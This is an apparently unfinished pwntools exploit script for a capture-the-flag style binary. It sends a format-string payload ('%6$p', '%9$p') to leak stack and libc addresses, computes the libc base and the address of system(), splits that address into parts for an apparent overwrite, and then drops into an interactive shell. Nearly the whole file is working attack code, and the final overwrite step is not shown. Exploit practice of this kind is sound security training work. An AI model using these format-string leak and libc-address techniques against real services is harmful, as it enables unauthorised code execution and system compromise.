from pwn import *
from LibcSearcher import*
import sys
remote_addr = ["",]
libc=ELF('./libc.so.6')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn")
    context(arch='i386', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

payload = "\n%6$p\n%9$p\n"
sa("HELLO?PWN IT!!!",payload)
ru('0x')
stack_addr = int(p.recvline().strip(),16)
ru('0x')
libc_leak = int(p.recvline().strip(),16) - 205

pr("libc_leak_addr",libc_leak)
libc_base = libc_leak - libc.symbols["__libc_start_main"]
sys_addr = libc_base + libc.symbols["system"]
sys_addr_0_2 = int(str(hex(sys_addr))[10:14],16)
sys_addr_2_4 = int(str(hex(sys_addr)[6:10]),16)
sys_addr_4_6 = int(str(hex(sys_addr)[2:6]),16)
#str_bin_sh = libc.search("/bin/sh\x00").next()
#str_bin_sh = libc_base + libc.symbols["str_bin_sh"]
pr("sys_addr",sys_addr)
pr("stack_addr",stack_addr)
pr("libc_base",libc_base)
pr("sys_addr_0_2",sys_addr_0_2)

#gdb.attach(p)









shell()
